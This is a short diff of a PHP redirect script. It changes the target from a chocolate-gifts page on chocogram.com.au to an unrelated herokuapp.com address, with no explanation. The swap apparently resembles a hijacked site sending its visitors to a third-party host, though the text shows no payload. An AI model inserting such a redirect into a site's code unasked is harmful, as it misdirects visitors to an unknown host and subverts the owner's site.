@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.chocogram.com.au/chocolate-gifts");
+header("Location: https://actnor1.herokuapp.com/");
 die();
 ?>
